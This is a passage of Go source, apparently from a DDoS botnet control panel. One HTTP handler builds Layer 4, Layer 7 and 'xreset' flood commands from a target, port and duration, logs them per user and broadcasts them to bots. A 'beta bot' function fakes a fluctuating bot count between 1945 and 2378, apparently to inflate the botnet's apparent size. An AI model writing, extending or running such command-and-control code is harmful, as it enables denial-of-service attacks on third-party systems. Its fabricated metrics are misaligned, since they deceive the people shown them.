			http.Error(w, "Port required for xreset", http.StatusBadRequest)
			return
		}
		cmd = fmt.Sprintf("%s %s %s %d", method, target, portStr, duration)
	} else if isL4 {
		if portStr == "" {
			activeAttacksMu.Unlock()
			http.Error(w, "Port required for Layer 4 methods", http.StatusBadRequest)
			return
		}
		cmd = fmt.Sprintf("%s %s %s %d", method, target, portStr, duration)
	} else if isL7 {
		cmd = fmt.Sprintf("%s %s %d", method, target, duration)
	} else {
		activeAttacksMu.Unlock()
		http.Error(w, "Unknown method", http.StatusBadRequest)
		return
	}

	newAttack := AttackInfo{
		Target:   target,
		Method:   method,
		Duration: duration,
		EndTime:  time.Now().Unix() + int64(duration),
	}
	activeAttacks[username] = append(activeAttacks[username], newAttack)
	activeAttacksMu.Unlock()

	broadcast(cmd)

	go func(user string, d int, t string, m string) {
		time.Sleep(time.Duration(d) * time.Second)
		activeAttacksMu.Lock()
		defer activeAttacksMu.Unlock()
		currentAttacks := activeAttacks[user]
		for i, atk := range currentAttacks {
			if atk.Target == t && atk.Method == m {
				activeAttacks[user] = append(currentAttacks[:i], currentAttacks[i+1:]...)
				break
			}
		}
	}(username, duration, target, method)

	fmt.Fprintf(w, "Attack sent successfully: %s", cmd)
}

var betaBotCount int64

func startBetaBotSimulation() {
	val := int64((1945 + 2378) / 2)
	atomic.StoreInt64(&betaBotCount, val)

	r := mrand.New(mrand.NewSource(time.Now().UnixNano()))

	go func() {
		for {
			sleepTime := time.Duration(r.Intn(53-22)+22) * time.Second
			time.Sleep(sleepTime)

			current := atomic.LoadInt64(&betaBotCount)

			direction := int64(1)
			if r.Intn(2) == 0 {
				direction = -1
			}
			magnitude := int64(r.Intn(30) + 1)
			change := direction * magnitude

			newVal := current + change

			if newVal < 1945 {
				newVal = 1945
			}
			if newVal > 2378 {
				newVal = 2378
			}

			atomic.StoreInt64(&betaBotCount, newVal)
		}
	}()
}